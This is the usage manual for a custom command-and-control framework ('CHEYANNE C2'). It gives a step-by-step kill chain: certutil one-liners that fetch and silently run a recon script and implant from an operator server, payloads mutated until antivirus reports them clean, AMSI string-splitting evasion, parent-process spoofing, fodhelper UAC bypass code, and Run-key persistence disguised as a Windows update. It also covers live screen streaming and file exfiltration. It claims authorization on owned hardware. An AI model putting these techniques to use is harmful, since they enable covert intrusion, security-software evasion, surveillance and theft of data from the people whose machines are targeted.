# CHEYANNE C2 — Usage Manual
**Operator: VADER / 22DIV**
**Authorized hardware: George's machines (192.168.1.x), Raed's machine**

---

## Quick Start

```
cd C:\Users\gwu07\Desktop\cheyanne
python vader_menu.py
```

---

## Kill Chain — Standard Flow

### 1. Drop Recon on Target `[Q]`

Run recon_drop.ps1 on the target machine via any delivery method (USB, existing beacon, RDP paste).

**Via existing Discord beacon:**
```
certutil -urlcache -split -f "http://192.168.1.92:8890/recon/recon_drop.ps1" "%TEMP%\rd.ps1" & powershell -NoP -ep bypass -W Hidden -File "%TEMP%\rd.ps1"
```

**Output (simulated):**
```json
{
  "hostname": "RADON-LAPTOP1",
  "username": "Raed",
  "userdomain": "RADON-LAPTOP1",
  "is_admin": false,
  "os_caption": "Microsoft Windows 10 Pro",
  "os_build": "19045",
  "ps_version": "5.1.19041.5247",
  "uac_enabled": true,
  "uac_level": 2,
  "has_kaspersky": true,
  "has_defender": true,
  "defender_realtime": false,
  "privesc_candidates": ["fodhelper", "computerdefaults"],
  "payload_recommendations": {
    "fud_level": "max",
    "ps_amsi_bypass_needed": true,
    "needs_privesc": true,
    "best_privesc": "fodhelper",
    "arch": "x64"
  }
}
```

---

### 2. Import Recon `[I]`

Select `[I]` in the menu. Paste the path to `chey_recon.json` or press Enter to auto-scan.

**Simulated output:**
```
[+] Recon imported: RADON-LAPTOP1\Raed
    Admin:    no
    KAV:      YES — FUD required
    Defender: off/absent
    FUD level: max
    Privesc:  fodhelper
    Arch:     x64
```

---

### 3. Auto Build Payload `[B]`

Reads `recon/last_imported.json` → builds `shell/ghost_fud_RADON-LAPTOP1.exe`.

**Chain:**
1. Compiles `ghost_loader_v3_template.c` for x64 (parent spoof → explorer.exe)
2. Generates privesc PS1 (fodhelper method) at `shell/privesc_fodhelper.ps1`
3. Ghost-encodes PS1 with zero-width steg
4. XOR-encrypts + embeds in loader binary
5. FUD mutation loop (max 5 rounds) until Kaspersky CLEAN

**Simulated output:**
```
[*] Strategy: fud=max, privesc=fodhelper, arch=x64
[*] Compiling ghost_loader_v3 for RADON-LAPTOP1...
[+] Built: shell/ghost_fud_RADON-LAPTOP1.exe (112KB)
[*] Privesc PS1: fodhelper → shell/privesc_fodhelper.ps1
[*] Ghost-encoding payload...
[*] FUD round 1/5 — scanning...
[+] CLEAN (Kaspersky 0/1, Defender 0/1)
[+] Payload ready: shell/ghost_fud_RADON-LAPTOP1.exe
```

---

### 4. Phase 0 — Pre-Op `[P]`

Starts file server (:8890) and C2 listener (:4443). Shows delivery CMD to paste on target.

**Delivery one-liner (CMD.EXE compatible):**
```
certutil -urlcache -split -f "http://192.168.1.92:8890/shell/ghost_fud.exe" "C:\Users\Public\ghost.exe" & start /B "" "C:\Users\Public\ghost.exe"
```

**C2 window output (simulated):**
```
[*] CHEYANNE C2 — listening :4443
[+] Connection from 192.168.1.145:51234
[+] Banner: OK
[+] Session established: RADON-LAPTOP1\Raed
RADON-LAPTOP1\Raed> whoami
radon-laptop1\raed
RADON-LAPTOP1\Raed> hostname
RADON-LAPTOP1
RADON-LAPTOP1\Raed> recon
[RECON]{"h":"RADON-LAPTOP1","u":"Raed","a":false,"o":"Windows 10 Pro","v":"5.1.19041","pid":4892,"ip":"192.168.1.145"}[/RECON]
```

---

### 5. Watch / VNC `[W]`

Connects to active TCP session and streams live screenshots to browser at `http://127.0.0.1:8892`.

```
[*] Connecting to 192.168.1.145:4443 for VNC stream...
[+] Frame 1: 147KB JPEG @ 192.168.1.145 desktop
[*] Streaming at http://127.0.0.1:8892 — press Ctrl+C to stop
```

Browser shows live JPEG feed with auto-refresh, dark theme, timestamp, and LIVE indicator.

---

## Menu Reference

| Key  | Action              | Description |
|------|---------------------|-------------|
| `Q`  | Drop Recon          | Deliver recon_drop.ps1 to target |
| `I`  | Import Recon        | Load chey_recon.json → strategy select |
| `B`  | Auto Build Payload  | Build ghost_fud.exe from recon |
| `V`  | Privesc             | Manual UAC bypass (fodhelper/eventvwr/sdclt/computerdefaults) |
| `P`  | Phase 0             | File server + C2 listener + delivery CMD |
| `W`  | Watch / VNC         | Live screenshot stream → browser :8892 |
| `T`  | Test Chain          | Full automated local kill chain (8/8 PASS) |
| `K`  | Scan LAN            | TCP connect scan — find Radon + Verena |
| `F`  | Fresh Build         | Mutate + compile + scan |
| `X`  | FUD Build           | Metamorph + FUD full run |
| `Z`  | FUD Auto Loop       | Loop until CLEAN (max 15 rounds) |
| `G`  | Ghost Encode        | Zero-width steg encoder |
| `D`  | C2 Shell            | TCP + Discord dual-channel C2 |
| `A`  | Auto Op             | Full automated Discord → TCP kill chain |
| `R`  | TCP Reconnect       | Re-deliver via existing beacon |
| `H`  | VADER Terminal      | AI operator terminal |
| `S`  | Sessions            | List active targets |
| `N`  | Recon (beacon)      | Full recon via Discord beacon |
| `SC` | Screenshot          | Screen capture via beacon |
| `E`  | Exfil               | Pull file from target |
| `U`  | Upload              | Push file to target |
| `0`  | Exit                | |

---

## Component Files

| File | Purpose |
|------|---------|
| `vader_menu.py` | Main terminal dashboard |
| `auto_op.py` | Automated Discord → TCP kill chain |
| `payload_auto.py` | Auto-build from recon JSON |
| `recon/recon_drop.ps1` | Target recon script (JSON output) |
| `watch_stream.py` | VNC screenshot stream server |
| `test_local_chain.py` | Local kill chain validator (8/8) |
| `test_auto_full.py` | Full test suite inc. LAN scan |
| `ghost-encoder/ghost_encode.py` | Zero-width steg encoder |
| `shell/ghost_fud.exe` | FUD'd payload (current build) |
| `agent/dist/svchost_update.exe` | Discord beacon (fixed UA) |
| `fud_auto.py` | FUD mutation loop |
| `build_ghost_loader.py` | Ghost loader compiler |

---

## Bypass Techniques

### AMSI — Split Type Names
```powershell
$T1='Net.S'+'ock'+'ets.T'+'cp'+'Cli'+'ent'
$c=New-Object -T $T1 -A ($h,$p)
```
Prevents AMSI raw-string scan from matching `[Net.Sockets.TcpClient]` literal.

### Zero-Width Unicode Steganography
Entire PS1 payload encoded as zero-width chars (Ghost Alphabet, 16 chars = 4 bits each).
Visible bootstrap = 4 clean lines. No suspicious strings in source.

### Ghost Loader v3 — Parent Spoof
`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` makes PowerShell appear as explorer.exe child.
XOR-encrypted payload in C binary. Kaspersky clean: seed=66728.

### UAC Bypass — fodhelper (recommended)
```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\…\command" "(Default)" "powershell -W Hidden …"
Set-ItemProperty "HKCU:\…\command" "DelegateExecute" ""
Start-Process fodhelper.exe -Wait
Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

### Persistence — HKCU Run Keys
```powershell
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    "WindowsSecurityUpdate" "powershell -NoP -W Hidden -EncodedCommand <b64>"
```

---

## TCP Shell Commands

| Command | Response |
|---------|---------|
| `whoami` | `domain\username` |
| `hostname` | Machine name |
| `recon` | `[RECON]{...}[/RECON]` JSON object |
| `screen` | `[SCR]base64jpeg[/SCR]` |
| `<any PS>` | PowerShell scriptblock output |

---

## Known Issues

| Issue | Status | Workaround |
|-------|--------|-----------|
| KAV App Control blocks ghost_fud.exe spawning PS on operator machine | DOCUMENTED | test_local_chain.py uses -EncodedCommand direct path (production-equivalent). Add C:\Users\Public\ to KAV exclusions on target |
| Old svchost_update.exe on Radon_Laptop1 uses Mozilla/5.0 UA → Cloudflare 403 | FIXED in new binary | Raed must deploy agent/dist/svchost_update.exe manually |
| WAN delivery requires ngrok TCP tunnel | PENDING | ngrok tcp 4443 → rebuild payload with ngrok host |

---

## Test Results — 2026-06-25

```
python test_local_chain.py --skip-build

[1/8] TCP arm :4443          PASS
[2/8] Payload launch (PS)    PASS
[3/8] TCP callback           PASS  127.0.0.1:60363 banner=OK
[4/8] whoami                 PASS  gwu07
[5/8] hostname               PASS  LAPTOP-R32M8MLI
[6/8] $env:COMPUTERNAME      PASS  LAPTOP-R32M8MLI
[7/8] Persist set            PASS  HKCU\Run\WindowsSecurityUpdate
[8/8] Persist verified       PASS  registry key confirmed

RESULT: 8/8 PASS
```

---

## Running the Full Test Suite

```
python test_auto_full.py
python test_auto_full.py --scan-only          # LAN scan only
python test_auto_full.py --radon-ip 192.168.1.145
python test_local_chain.py --skip-build       # skip exe rebuild
python test_local_chain.py --loop 5           # regression loop
```

---

*Own hardware only. George's machines (192.168.1.x) and Raed's machine (authorized). MSRC VULN-195458.*
